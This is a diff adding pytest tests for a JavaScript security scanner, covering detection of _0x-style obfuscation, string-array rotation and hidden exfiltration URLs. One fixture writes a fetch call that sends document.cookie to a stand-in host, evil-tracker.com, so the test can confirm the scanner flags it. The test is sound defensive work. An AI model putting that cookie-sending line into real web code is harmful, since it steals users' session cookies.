@@ -388,3 +388,78 @@ class TestJSScannerAST:
         eval_findings = [f for f in findings if f.category == "code_injection"]
         assert len(eval_findings) > 0
         assert eval_findings[0].line == 3
+
+
+class TestObfuscationDetection:
+    """Tests for deliberate code obfuscation detection."""
+
+    def test_hex_var_obfuscation_detected(self, tmp_path):
+        """Classic _0x obfuscation pattern should be flagged as HIGH."""
+        f = tmp_path / "obfuscated.js"
+        f.write_text(
+            'function _0x3ff6(_0x466405,_0x3a51bd){_0x466405=_0x466405-0x17d;'
+            'const _0x43e626=_0x43e6();let _0x3ff61a=_0x43e626[_0x466405];'
+            'var _0x215501=function(_0x478595){return _0x478595;};'
+            'var _0x52447e=_0x43e626[0x0];'
+            'var _0x15534f=_0x466405+_0x52447e;'
+            'return _0x3ff61a;}\n'
+        )
+        findings = scan_js_file(f)
+        obf = [fi for fi in findings if fi.category == "obfuscation"]
+        assert len(obf) >= 1
+        assert obf[0].severity == Severity.HIGH
+        assert "_0x" in obf[0].description or "hex" in obf[0].description.lower()
+
+    def test_minified_code_not_flagged(self, tmp_path):
+        """Normal minified code should NOT trigger obfuscation detection."""
+        f = tmp_path / "minified.js"
+        f.write_text(
+            'var a=1,b=2,c=function(d){return d+a};'
+            'function e(f,g){return f*g+b}'
+            'var h=e(3,4);console.log(h);\n'
+        )
+        findings = scan_js_file(f)
+        obf = [fi for fi in findings if fi.category == "obfuscation" and fi.severity == Severity.HIGH]
+        assert len(obf) == 0
+
+    def test_string_rotation_detected(self, tmp_path):
+        """String array push/shift rotation pattern should be noted."""
+        f = tmp_path / "rotated.js"
+        f.write_text(
+            "function _0x43e6(){return ['a','b','c'];}\n"
+            "var _0x1234 = _0x43e6();\n"
+            "var _0x5678 = _0x1234;\n"
+            "var _0x9abc = _0x5678;\n"
+            "var _0xdef0 = _0x9abc;\n"
+            "var _0xaaaa = _0xdef0;\n"
+            "_0x1234['push'](_0x1234['shift']());\n"
+        )
+        findings = scan_js_file(f)
+        obf = [fi for fi in findings if fi.category == "obfuscation" and fi.severity == Severity.HIGH]
+        assert len(obf) >= 1
+        assert any("rotation" in fi.description.lower() for fi in obf)
+
+    def test_hidden_urls_in_obfuscated_code(self, tmp_path):
+        """External URLs in obfuscated code should flag data_exfiltration."""
+        f = tmp_path / "phoning.js"
+        f.write_text(
+            "var _0x1111=1;var _0x2222=2;var _0x3333=3;"
+            "var _0x4444=4;var _0x5555=5;var _0x6666=6;"
+            "fetch('https://evil-tracker.com/collect?data='+document.cookie);\n"
+        )
+        findings = scan_js_file(f)
+        exfil = [fi for fi in findings if fi.category == "data_exfiltration"]
+        assert len(exfil) >= 1
+        assert any("evil-tracker.com" in fi.description for fi in exfil)
+
+    def test_safe_urls_not_flagged(self, tmp_path):
+        """GitHub and HA URLs in obfuscated code should not flag exfiltration."""
+        f = tmp_path / "safe_urls.js"
+        f.write_text(
+            "var _0x1111=1;var _0x2222=2;var _0x3333=3;"
+            "var _0x4444=4;var _0x5555=5;var _0x6666=6;"
+            "fetch('https://github.com/user/repo');\n"
+        )
+        findings = scan_js_file(f)
+        exfil = [fi for fi in findings if fi.category == "data_exfiltration"]
+        assert len(exfil) == 0
